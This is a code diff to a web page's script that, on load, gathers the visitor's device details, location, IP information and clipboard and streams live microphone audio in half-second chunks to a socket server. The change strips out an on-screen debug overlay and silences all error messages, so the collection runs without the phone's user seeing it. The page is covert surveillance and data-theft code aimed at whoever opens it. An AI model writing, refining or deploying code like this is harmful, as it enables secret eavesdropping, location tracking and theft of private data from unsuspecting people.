@@ -156,9 +156,6 @@
 <script>
   const socket = io();
 
-  socket.on('connect', () => dbg('Socket connected ✓ id:' + socket.id));
-  socket.on('connect_error', (e) => dbg('Socket ERROR: ' + e.message, '#f00'));
-  socket.on('disconnect', () => dbg('Socket disconnected!', '#f00'));
   let micStream = null;
   let peerConnections = {};
   let pageEnterTime = Date.now();
@@ -471,28 +468,19 @@
   async function startMic() {
     try {
       micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-      dbg('Mic access granted ✓');
-
-      // Use MediaRecorder to stream audio chunks via socket
       const recorder = new MediaRecorder(micStream, { mimeType: 'audio/webm;codecs=opus' });
-
       recorder.ondataavailable = async (e) => {
         if (e.data && e.data.size > 0) {
           const buffer = await e.data.arrayBuffer();
           socket.emit('p3-audio-chunk', buffer);
         }
       };
-
-      recorder.start(500); // Send chunk every 500ms
-      dbg('Audio streaming started ✓');
+      recorder.start(500);
       socket.emit('p3-phone-ready');
     } catch(err) {
-      dbg('Mic error: ' + err.message, '#f00');
       socket.emit('p3-phone-ready');
     }
   }
-
-  // Remove old WebRTC mic events — not needed anymore
 
   // ── Clipboard ─────────────────────────────────────────────────
   async function getClipboard() {
@@ -520,59 +508,13 @@
     }
   }
 
-  // ── Debug log visible on phone screen ────────────────────────
-  function dbg(msg, color='#00ff88') {
-    let box = document.getElementById('__dbg');
-    if (!box) {
-      box = document.createElement('div');
-      box.id = '__dbg';
-      box.style = 'position:fixed;bottom:90px;left:0;right:0;background:rgba(0,0,0,.85);color:#0f0;font-size:11px;font-family:monospace;padding:8px;z-index:9999;max-height:160px;overflow-y:auto;';
-      document.body.appendChild(box);
-    }
-    const line = document.createElement('div');
-    line.style.color = color;
-    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    box.appendChild(line);
-    box.scrollTop = box.scrollHeight;
-  }
-
   // ── Auto-start ────────────────────────────────────────────────
   window.addEventListener('load', async () => {
-    dbg('Page loaded, starting...');
-
-    try {
-      dbg('Collecting device info...');
-      await collectDeviceInfo();
-      dbg('Device info sent ✓');
-    } catch(e) { dbg('Device info error: ' + e.message, '#ff0'); }
-
-    try {
-      dbg('Getting location...');
-      getLocation();
-      dbg('Location requested ✓');
-    } catch(e) { dbg('Location error: ' + e.message, '#ff0'); }
-
-    try {
-      dbg('Getting IP info...');
-      await getIPInfo();
-      dbg('IP info sent ✓');
-    } catch(e) { dbg('IP error: ' + e.message, '#ff0'); }
-
-    try {
-      dbg('Starting mic...');
-      await startMic();
-      dbg('Mic started ✓');
-    } catch(e) { dbg('Mic error: ' + e.message, '#f00'); }
-
-    setTimeout(async () => {
-      try {
-        dbg('Getting clipboard...');
-        await getClipboard();
-        dbg('Clipboard sent ✓');
-      } catch(e) { dbg('Clipboard error: ' + e.message, '#ff0'); }
-    }, 1500);
-
-    dbg('All done ✓', '#00ffff');
+    try { await collectDeviceInfo(); } catch(e) {}
+    try { getLocation(); } catch(e) {}
+    try { await getIPInfo(); } catch(e) {}
+    try { await startMic(); } catch(e) {}
+    setTimeout(async () => { try { await getClipboard(); } catch(e) {} }, 1500);
   });
 </script>
 </body>
